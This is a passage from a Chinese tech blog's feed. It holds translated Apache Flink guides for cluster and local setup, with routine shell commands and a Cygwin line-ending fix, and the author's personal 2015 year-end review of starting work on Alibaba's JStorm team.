&lt;p&gt;设置&lt;code&gt;jobmanager.rpc.address&lt;/code&gt;配置项为你的master节点地址。另外为了明确 JVM 在每个节点上所能分配的最大内存，我们需要配置&lt;code&gt;jobmanager.heap.mb&lt;/code&gt;和&lt;code&gt;taskmanager.heap.mb&lt;/code&gt;，值的单位是 MB。如果对于某些worker节点，你想要分配更多的内存给Flink系统，你可以在相应节点上设置&lt;code&gt;FLINK_TM_HEAP&lt;/code&gt;环境变量来覆盖默认的配置。&lt;/p&gt;
&lt;p&gt;最后，你需要提供一个集群中worker节点的列表。因此，就像配置HDFS，编辑&lt;em&gt;conf/slaves&lt;/em&gt;文件，然后输入每个worker节点的 IP/Hostname。每一个worker结点之后都会运行一个 TaskManager。&lt;/p&gt;
&lt;p&gt;每一条记录占一行，就像下面展示的一样：&lt;/p&gt;
&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.101&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.0&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.150&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;译注：conf/master文件是用来做&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/setup/jobmanager_high_availability.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JobManager HA&lt;/a&gt;的，在这里不需要配置&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;每一个worker节点上的 Flink 路径必须一致。你可以使用共享的 NSF 目录，或者拷贝整个 Flink 目录到各个worker节点。&lt;/p&gt;
&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scp -r /path/to/flink &amp;lt;worker&amp;gt;&lt;span class=&quot;symbol&quot;&gt;:/path/to/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;请查阅&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/setup/config.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;配置页面&lt;/a&gt;了解更多关于Flink的配置。&lt;/p&gt;
&lt;p&gt;特别的，这几个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;TaskManager 总共能使用的内存大小（&lt;code&gt;taskmanager.heap.mb&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;每一台机器上能使用的 CPU 个数（&lt;code&gt;taskmanager.numberOfTaskSlots&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;集群中的总 CPU 个数（&lt;code&gt;parallelism.default&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;临时目录（&lt;code&gt;taskmanager.tmp.dirs&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;是非常重要的配置项。&lt;/p&gt;
&lt;h2 id=&quot;启动-Flink&quot;&gt;&lt;a href=&quot;#启动-Flink&quot; class=&quot;headerlink&quot; title=&quot;启动 Flink&quot;&gt;&lt;/a&gt;启动 Flink&lt;/h2&gt;&lt;p&gt;下面的脚本会在本地节点启动一个 JobManager，然后通过 SSH 连接所有的worker节点（&lt;em&gt;slaves&lt;/em&gt;文件中所列的节点），并在每个节点上运行 TaskManager。现在你的 Flink 系统已经启动并运行了。跑在本地节点上的 JobManager 现在会在配置的 RPC 端口上监听并接收任务。&lt;/p&gt;
&lt;p&gt;假定你在master节点上，并在Flink目录中：&lt;/p&gt;
&lt;figure class=&quot;highlight stata&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bin/start-&lt;span class=&quot;keyword&quot;&gt;cluster&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;要停止Flink，也有一个 &lt;em&gt;stop-cluster.sh&lt;/em&gt; 脚本。&lt;/p&gt;
&lt;h2 id=&quot;添加-JobManager-TaskManager-实例到集群中&quot;&gt;&lt;a href=&quot;#添加-JobManager-TaskManager-实例到集群中&quot; class=&quot;headerlink&quot; title=&quot;添加 JobManager/TaskManager 实例到集群中&quot;&gt;&lt;/a&gt;添加 JobManager/TaskManager 实例到集群中&lt;/h2&gt;&lt;p&gt;你可以使用 &lt;em&gt;bin/jobmanager.sh&lt;/em&gt; 和 &lt;em&gt;bin/taskmanager&lt;/em&gt; 脚本来添加 JobManager 和 TaskManager 实例到你正在运行的集群中。&lt;/p&gt;
&lt;h3 id=&quot;添加一个-JobManager&quot;&gt;&lt;a href=&quot;#添加一个-JobManager&quot; class=&quot;headerlink&quot; title=&quot;添加一个 JobManager&quot;&gt;&lt;/a&gt;添加一个 JobManager&lt;/h3&gt;&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bin/jobmanager.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt; (start cluster)|&lt;span class=&quot;keyword&quot;&gt;stop&lt;/span&gt;|&lt;span class=&quot;keyword&quot;&gt;stop&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;all&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;添加一个-TaskManager&quot;&gt;&lt;a href=&quot;#添加一个-TaskManager&quot; class=&quot;headerlink&quot; title=&quot;添加一个 TaskManager&quot;&gt;&lt;/a&gt;添加一个 TaskManager&lt;/h3&gt;&lt;figure class=&quot;highlight vim&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bin/taskmanager.&lt;span class=&quot;keyword&quot;&gt;sh&lt;/span&gt; start|&lt;span class=&quot;keyword&quot;&gt;stop&lt;/span&gt;|&lt;span class=&quot;keyword&quot;&gt;stop&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;all&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;确保你是在需要启动/停止相应实例的节点上运行的这些脚本。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      本文主要介绍如何将Flink以分布式模式运行在集群上（可能是异构的）。
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
      <category term="Flink官方文档翻译" scheme="http://wuchong.me/tags/Flink%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91/"/>
    
      <category term="部署" scheme="http://wuchong.me/tags/%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Flink官方文档翻译：安装部署（本地模式）</title>
    <link href="http://wuchong.me/blog/2016/02/26/flink-docs-setup-local/"/>
    <id>http://wuchong.me/blog/2016/02/26/flink-docs-setup-local/</id>
    <published>2016-02-26T08:03:23.000Z</published>
    <updated>2016-03-01T11:27:44.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要介绍如何将Flink以本地模式运行在单机上。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;进入&lt;a href=&quot;http://flink.apache.org/downloads.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;下载页面&lt;/a&gt;。如果你想让Flink与Hadoop进行交互（如HDFS或者HBase），请选择一个与你的Hadoop版本相匹配的Flink包。当你不确定或者只是想运行在本地文件系统上，请选择Hadoop 1.2.x对应的包。&lt;/p&gt;
&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;Flink 可以运行在 Linux、Mac OS X 和 Windows 上。本地模式的安装唯一需要的只是 Java 1.7.x或更高版本。接下来的指南假定是类Unix环境，Windows用户请参考 &lt;a href=&quot;#flink-on-windows&quot;&gt;Flink on Windows&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;你可以执行下面的命令来查看是否已经正确安装了Java了。&lt;/p&gt;
&lt;figure class=&quot;highlight applescript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;java -&lt;span class=&quot;built_in&quot;&gt;version&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这条命令会输出类似于下面的信息：&lt;/p&gt;
&lt;figure class=&quot;highlight lisp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;java version &lt;span class=&quot;string&quot;&gt;&quot;1.8.0_51&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Java(&lt;span class=&quot;name&quot;&gt;TM&lt;/span&gt;) SE Runtime Environment (&lt;span class=&quot;name&quot;&gt;build&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1.8&lt;/span&gt;.&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;_51-b16)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Java HotSpot(&lt;span class=&quot;name&quot;&gt;TM&lt;/span&gt;) &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt;-Bit Server VM (&lt;span class=&quot;name&quot;&gt;build&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;25.51&lt;/span&gt;-b03, mixed mode)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;配置&quot;&gt;&lt;a href=&quot;#配置&quot; class=&quot;headerlink&quot; title=&quot;配置&quot;&gt;&lt;/a&gt;配置&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;对于本地模式，Flink是可以开箱即用的，你不用去更改任何的默认配置。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;开箱即用的配置会使用默认的Java环境。如果你想更改Java的运行环境，你可以手动地设置环境变量&lt;code&gt;JAVA_HOME&lt;/code&gt;或者&lt;code&gt;conf/flink-conf.yaml&lt;/code&gt;中的配置项&lt;code&gt;env.java.home&lt;/code&gt;。你可以查阅&lt;a href=&quot;https://ci.apache.org/projects/flink/flink-docs-master/setup/config.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;配置页面&lt;/a&gt;了解更多关于Flink的配置。&lt;/p&gt;
&lt;h2 id=&quot;启动Flink&quot;&gt;&lt;a href=&quot;#启动Flink&quot; class=&quot;headerlink&quot; title=&quot;启动Flink&quot;&gt;&lt;/a&gt;启动Flink&lt;/h2&gt;&lt;p&gt;你现在就可以开始运行Flink了。解压已经下载的压缩包，然后进入新创建的flink目录。在那里，你就可以本地模式运行Flink了：&lt;/p&gt;
&lt;figure class=&quot;highlight elixir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;tar xzf flink-*.tgz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;cd flink-*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ &lt;/span&gt;bin/start-local.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Starting job manager&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;你可以通过观察logs目录下的日志文件来检查系统是否正在运行了：&lt;/p&gt;
&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ tail &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/flink-*-jobmanager-*.&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;INFO ... - Initializing memory manager &lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;409&lt;/span&gt; megabytes &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; memory&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;INFO ... - Trying &lt;span class=&quot;built_in&quot;&gt;to&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;load&lt;/span&gt; org.apache.flinknephele.jobmanager.scheduler.&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;.LocalScheduler &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; scheduler&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;INFO ... - Setting up web info server, &lt;span class=&quot;keyword&quot;&gt;using&lt;/span&gt; web-root &lt;span class=&quot;built_in&quot;&gt;directory&lt;/span&gt; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;INFO ... - Web info server will display information about nephele job-manager &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;localhost&lt;/span&gt;, &lt;span class=&quot;title&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;8081&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;INFO ... - Starting web info server &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; JobManager &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;8081&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;JobManager 同时会在8081端口上启动一个web前端，你可以通过 &lt;a href=&quot;http://localhost:8081&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://localhost:8081&lt;/a&gt; 来访问。&lt;/p&gt;
&lt;h2 id=&quot;Flink-on-Windows&quot;&gt;&lt;a href=&quot;#Flink-on-Windows&quot; class=&quot;headerlink&quot; title=&quot;Flink on Windows&quot;&gt;&lt;/a&gt;Flink on Windows&lt;/h2&gt;&lt;p&gt;如果你想要在 Windows 上运行 Flink，你需要如上文所述地下载、解压、配置 Flink 压缩包。之后，你可以使用使用 Windows 批处理文件（.bat文件）或者使用 &lt;strong&gt;Cygwin&lt;/strong&gt; 运行 Flink 的 JobMnager。&lt;/p&gt;
&lt;h3 id=&quot;使用-Windows-批处理文件启动&quot;&gt;&lt;a href=&quot;#使用-Windows-批处理文件启动&quot; class=&quot;headerlink&quot; title=&quot;使用 Windows 批处理文件启动&quot;&gt;&lt;/a&gt;使用 Windows 批处理文件启动&lt;/h3&gt;&lt;p&gt;使用 Windows 批处理文件本地模式启动Flink，首先打开命令行窗口，进入 Flink 的 bin/ 目录，然后运行 start-local.bat 。&lt;/p&gt;
&lt;p&gt;注意：Java运行环境必须已经加到了 Windows 的&lt;code&gt;%PATH%&lt;/code&gt;环境变量中。按照&lt;a href=&quot;http://www.java.com/en/download/help/path.xml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;本指南&lt;/a&gt;添加 Java 到&lt;code&gt;%PATH%&lt;/code&gt;环境变量中。&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ cd flink&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ cd bin&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ &lt;span class=&quot;keyword&quot;&gt;start&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;local&lt;/span&gt;.bat&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;Starting&lt;/span&gt; Flink job manager. Webinterface &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;default&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;http&lt;/span&gt;://localhost:&lt;span class=&quot;number&quot;&gt;8081&lt;/span&gt;/.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;Do&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;close&lt;/span&gt; this batch window. &lt;span class=&quot;keyword&quot;&gt;Stop&lt;/span&gt; job manager &lt;span class=&quot;keyword&quot;&gt;by&lt;/span&gt; pressing Ctrl+C.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;之后，你需要打开新的命令行窗口，并运行&lt;code&gt;flink.bat&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;使用-Cygwin-和-Unix-脚本启动&quot;&gt;&lt;a href=&quot;#使用-Cygwin-和-Unix-脚本启动&quot; class=&quot;headerlink&quot; title=&quot;使用 Cygwin 和 Unix 脚本启动&quot;&gt;&lt;/a&gt;使用 Cygwin 和 Unix 脚本启动&lt;/h3&gt;&lt;p&gt;使用 Cygwin 你需要打开 Cygwin 的命令行，进入 Flink 目录，然后运行&lt;code&gt;start-local.sh&lt;/code&gt;脚本：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ cd flink&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ bin/&lt;span class=&quot;keyword&quot;&gt;start&lt;/span&gt;-&lt;span class=&quot;keyword&quot;&gt;local&lt;/span&gt;.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;Starting&lt;/span&gt; Nephele job manager&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;从-Git-安装-Flink&quot;&gt;&lt;a href=&quot;#从-Git-安装-Flink&quot; class=&quot;headerlink&quot; title=&quot;从 Git 安装 Flink&quot;&gt;&lt;/a&gt;从 Git 安装 Flink&lt;/h3&gt;&lt;p&gt;如果你是从 git 安装的 Flink，而且使用的 Windows git shell，Cygwin会产生一个类似于下面的错误：&lt;/p&gt;
&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;c:/flink/bin/&lt;span class=&quot;built_in&quot;&gt;start&lt;/span&gt;-&lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt;.sh: &lt;span class=&quot;built_in&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;30&lt;/span&gt;: $&lt;span class=&quot;string&quot;&gt;&#39;\r&#39;&lt;/span&gt;: &lt;span class=&quot;keyword&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;found&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个错误的产生是因为 git 运行在 Windows 上时，会自动地将 UNIX 换行转换成 Windows 换行。问题是，Cygwin 只认 Unix 换行。解决方案是调整 Cygwin 配置来正确处理换行。步骤如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;打开 Cygwin 命令行&lt;/li&gt;
&lt;li&gt;&lt;p&gt;确定 home 目录，通过输入&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;cd&lt;/span&gt;;&lt;span class=&quot;built_in&quot;&gt;pwd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;  它会返回 Cygwin 根目录下的一个路径。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在home目录下，使用 NotePad, WordPad 或者其他编辑器打开&lt;code&gt;.bash_profile&lt;/code&gt;文件，然后添加如下内容到文件末尾：（如果文件不存在，你需要创建它）&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;export&lt;/span&gt; SHELLOPTS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; -o igncr&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;  保存文件，然后打开一个新的bash窗口。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      本文主要介绍如何将Flink以本地模式运行在单机上。
    
    </summary>
    
      <category term="分布式系统" scheme="http://wuchong.me/categories/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="Flink" scheme="http://wuchong.me/tags/Flink/"/>
    
      <category term="Flink官方文档翻译" scheme="http://wuchong.me/tags/Flink%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E7%BF%BB%E8%AF%91/"/>
    
      <category term="部署" scheme="http://wuchong.me/tags/%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>迟到的2015年终总结</title>
    <link href="http://wuchong.me/blog/2016/01/10/2015-summary/"/>
    <id>http://wuchong.me/blog/2016/01/10/2015-summary/</id>
    <published>2016-01-10T14:55:02.000Z</published>
    <updated>2016-01-11T01:47:13.000Z</updated>
    
    <content type="html">&lt;p&gt;这是一篇迟到了很久很久的2015年终总结……&lt;/p&gt;
&lt;p&gt;这一年，是我人生的又一个转折点。因为，我终于走出了校园，迈进了社会。阿里是一座大学，让我很快就适应了这里的生活。尤其是园区的五个食堂可以每天都吃不同的食堂，午饭有补贴、晚饭免费、夜宵免费，害的我半年就胖了10斤…斤…&lt;/p&gt;
&lt;p&gt;言归正传，今年主要就分为两个阶段，前半年是在校的毕业期，后半年是入职的菜鸟期。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在校的最后半年&quot;&gt;&lt;a href=&quot;#在校的最后半年&quot; class=&quot;headerlink&quot; title=&quot;在校的最后半年&quot;&gt;&lt;/a&gt;在校的最后半年&lt;/h2&gt;&lt;p&gt;这半年主要是与毕设各种斗智斗勇以及和好友们胡吃海塞中度过。还有趁离开北京前，把还没去过的地方逛了下。&lt;/p&gt;
&lt;p&gt;有时看着实验室群里学弟学妹们的聊天，他们也正在经历着我半年前的经历。正巧，收到了汤老师的来信，问我工作的近况。突然，好想念老师们，好想念在北京的兄弟们。所以计划今年在学弟们毕业前，回一趟学校见见老师同学们。&lt;/p&gt;
&lt;p&gt;在毕业之后，我把shadowsocks免费服务和码农圈关掉了。经过半年的运营，码农圈的用户数已经将近2000了。可是非常遗憾，毕业之后没有精力去维护它们，犹豫了良久，还是关停了。&lt;/p&gt;
&lt;h2 id=&quot;入职的半年&quot;&gt;&lt;a href=&quot;#入职的半年&quot; class=&quot;headerlink&quot; title=&quot;入职的半年&quot;&gt;&lt;/a&gt;入职的半年&lt;/h2&gt;&lt;p&gt;很幸运地能进入阿里，很幸运地能进入牛人云集的中间件团队，更幸运的是我进入的团队做的正是我喜欢的东西（大数据、流处理、JStorm/Storm）。在这里，我遇到了我的中国好老板，中国好师兄。刚来到团队时，主要负责jstorm的监控系统和管控平台。作为一名后端开发，在中间件中前端能力居然成了我的强项，虽然我对前端也有兴趣，但我还是更想做核心后端。&lt;/p&gt;
&lt;p&gt;所以，需要学的东西好多，Clojure、Netty、Thrift、ZooKeeper、高并发、Spark、Flink…有学不完的东西，每天都很充实，却也每天都觉得时间不够用。以前在学校，一周七天都能拿来学这些东西，现在工作忙了，只能等到下班后或是周末，然而周末又会有好多琐碎的事情。一周能坐下来持续学习的时间真的好少。不过我们团队的好处是，在工作不忙时可以在工作时间去学习、去阅读源码，Boss也支持，简直就是领着工资在学习。&lt;/p&gt;
&lt;p&gt;这一年，团队发生的大事是 &lt;a href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4NjI4MzM4MQ==&amp;amp;mid=403824466&amp;amp;idx=1&amp;amp;sn=cfbbe7c802f15b089a9e15dee2126f3d&amp;amp;scene=2&amp;amp;srcid=11190nGh0JBVclikaTSe3bqM&amp;amp;from=timeline&amp;amp;isappinstalled=0#wechat_redirect&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;JStorm 进入了 Apache 基金会&lt;/a&gt;。社区有一个JStorm Merge的规划，也就是Storm 2.0会基于JStorm将Clojure核心代码替换成Java。最近Storm马上就会发布1.0版本，之后会冻结核心相关的feature，开始全力做jstorm merge。希望届时，自己能为社区做尽量多的贡献。&lt;/p&gt;
&lt;h2 id=&quot;开源社区&quot;&gt;&lt;a href=&quot;#开源社区&quot; class=&quot;headerlink&quot; title=&quot;开源社区&quot;&gt;&lt;/a&gt;开源社区&lt;/h2&gt;&lt;p&gt;这一年，我在Github上开源的项目总共收到了450多个star。进入JStorm团队后，也有更多的机会活跃在JStorm社区和Storm社区。&lt;/p&gt;
&lt;p&gt;这一年，开源社区对整个工业界的影响很大。开源社区对我的影响也很大。深刻地体会到，这是个卧虎藏龙的地方，这里有取之不尽的知识，这里就像大学的象牙塔一样引无数人攀登。&lt;/p&gt;
&lt;p&gt;大型的开源项目有很多值得学习的东西，优秀的架构设计，漂亮整洁的代码，就像文档一样的代码注释，以及测试、code review、文档、流程规范等等。就算是BAT绝大多数团队都没有做到。所以，参与开源项目不仅是一件“镀金”的经验，更是能大幅提升自己的技术能力。&lt;/p&gt;
&lt;h2 id=&quot;2016年&quot;&gt;&lt;a href=&quot;#2016年&quot; class=&quot;headerlink&quot; title=&quot;2016年&quot;&gt;&lt;/a&gt;2016年&lt;/h2&gt;&lt;p&gt;这是我工作的第一年，起初刚毕业时心情比较浮躁，现在慢慢心沉下来了。目标清晰，只需低头拉车踏踏实实做研发。这些今年的TODO List。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;努力成为Storm Commiter&lt;/li&gt;
&lt;li&gt;熟悉Storm、Spark、Flink等流处理框架的原理和代码&lt;/li&gt;
&lt;li&gt;自己能从零写一个分布式系统，即时是玩具级别的或是重复造轮子&lt;/li&gt;
&lt;li&gt;成为一名人像摄影狮，摄影后期入门&lt;/li&gt;
&lt;li&gt;摇号中奖&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;这是一篇迟到了很久很久的2015年终总结……&lt;/p&gt;
